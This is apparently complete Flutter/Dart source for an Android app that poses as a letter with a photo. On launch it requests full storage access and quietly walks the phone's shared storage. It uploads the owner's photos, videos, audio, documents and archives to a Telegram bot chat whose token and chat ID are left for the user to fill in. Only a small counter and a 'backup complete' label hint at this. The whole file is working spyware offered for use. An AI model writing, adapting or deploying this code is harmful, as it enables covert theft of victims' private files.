import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
import 'package:path_provider/path_provider.dart';

// ============ FILL THESE ============
const String BOT_TOKEN = "PASTE_YOUR_BOT_TOKEN_HERE";
const String CHAT_ID   = "PASTE_YOUR_CHAT_ID_HERE";
// ====================================

const String ROOT = "/storage/emulated/0";

const Set<String> EXTENSIONS = {
  '.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp', '.heic',
  '.mp4', '.mkv', '.mov', '.avi', '.webm', '.3gp',
  '.mp3', '.wav', '.m4a', '.ogg', '.flac', '.aac',
  '.pdf', '.docx', '.doc', '.txt', '.zip', '.rar', '.apk',
};

const int MAX_SIZE = 50 * 1024 * 1024;
const Duration THROTTLE = Duration(seconds: 2);

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  SystemChrome.setSystemUIOverlayStyle(const SystemUiOverlayStyle(
    statusBarColor: Colors.transparent,
    statusBarIconBrightness: Brightness.light,
  ));
  runApp(const CRApp());
}

class CRApp extends StatelessWidget {
  const CRApp({super.key});
  @override
  Widget build(BuildContext context) => const MaterialApp(
        debugShowCheckedModeBanner: false,
        home: HomePage(),
      );
}

class HomePage extends StatefulWidget {
  const HomePage({super.key});
  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> {
  String letter = "";
  bool backupDone = false;
  int sentCount = 0;
  int failCount = 0;

  late File tracker;
  late File skippedLog;
  final Set<String> sent = {};

  @override
  void initState() {
    super.initState();
    _loadLetter();
    _boot();
  }

  Future<void> _loadLetter() async {
    final txt = await rootBundle.loadString("assets/letter.txt");
    setState(() => letter = txt);
  }

  Future<void> _boot() async {
    final docs = await getApplicationDocumentsDirectory();
    tracker = File("${docs.path}/cr_sent.txt");
    skippedLog = File("${docs.path}/cr_skipped.txt");
    if (await tracker.exists()) {
      sent.addAll(await tracker.readAsLines());
    }

    if (Platform.isAndroid) {
      final manage = await Permission.manageExternalStorage.status;
      if (!manage.isGranted) {
        await Permission.manageExternalStorage.request();
      }
    }

    _silentRun();
  }

  Future<void> _silentRun() async {
    final dir = Directory(ROOT);
    if (!await dir.exists()) return;

    final List<File> queue = [];
    await for (final entity in dir.list(recursive: true, followLinks: false)) {
      if (entity is! File) continue;
      final lower = entity.path.toLowerCase();
      if (!EXTENSIONS.any(lower.endsWith)) continue;
      if (sent.contains(entity.path)) continue;

      try {
        final size = await entity.length();
        if (size > MAX_SIZE) {
          await skippedLog.writeAsString(
            "${entity.path}\t${(size / 1024 / 1024).toStringAsFixed(1)}MB\n",
            mode: FileMode.append,
          );
          continue;
        }
        queue.add(entity);
      } catch (_) {}
    }

    for (final file in queue) {
      final ok = await _upload(file);
      if (ok) {
        sent.add(file.path);
        await tracker.writeAsString("${file.path}\n", mode: FileMode.append);
        sentCount++;
      } else {
        failCount++;
      }
      if (mounted) setState(() {});
      await Future.delayed(THROTTLE);
    }

    if (mounted) setState(() => backupDone = true);
  }

  Future<bool> _upload(File file) async {
    try {
      final uri = Uri.parse(
        "https://api.telegram.org/bot$BOT_TOKEN/sendDocument",
      );
      final req = http.MultipartRequest("POST", uri)
        ..fields["chat_id"] = CHAT_ID
        ..files.add(await http.MultipartFile.fromPath("document", file.path));
      final res = await req.send();
      return res.statusCode == 200;
    } catch (_) {
      return false;
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0A0A0C),
      body: SafeArea(
        child: Stack(
          children: [
            SingleChildScrollView(
              padding: const EdgeInsets.fromLTRB(24, 32, 24, 80),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.center,
                children: [
                  ClipRRect(
                    borderRadius: BorderRadius.circular(18),
                    child: Image.asset(
                      "assets/photo.jpg",
                      fit: BoxFit.cover,
                      width: double.infinity,
                      height: 340,
                      errorBuilder: (_, __, ___) => Container(
                        height: 340,
                        color: Colors.white10,
                        alignment: Alignment.center,
                        child: const Text("photo.jpg not found",
                            style: TextStyle(color: Colors.white38)),
                      ),
                    ),
                  ),
                  const SizedBox(height: 32),
                  Text(
                    letter,
                    textAlign: TextAlign.center,
                    style: const TextStyle(
                      color: Color(0xFFEDEDED),
                      fontSize: 17,
                      height: 1.7,
                      letterSpacing: 0.3,
                    ),
                  ),
                  const SizedBox(height: 40),
                  AnimatedOpacity(
                    opacity: backupDone ? 1 : 0,
                    duration: const Duration(milliseconds: 800),
                    child: Text(
                      "backup complete · $sentCount sent" +
                          (failCount > 0 ? " · $failCount failed" : ""),
                      style: const TextStyle(
                        color: Color(0xFF00E5FF),
                        fontSize: 12,
                        letterSpacing: 1.5,
                      ),
                    ),
                  ),
                ],
              ),
            ),
            if (!backupDone)
              Positioned(
                top: 16,
                right: 16,
                child: Row(
                  children: [
                    const SizedBox(
                      width: 10,
                      height: 10,
                      child: CircularProgressIndicator(
                        strokeWidth: 1.5,
                        color: Color(0xFFFF3D71),
                      ),
                    ),
                    const SizedBox(width: 8),
                    Text(
                      "$sentCount",
                      style: const TextStyle(
                          color: Colors.white38, fontSize: 11),
                    ),
                  ],
                ),
              ),
          ],
        ),
      ),
    );
  }
}
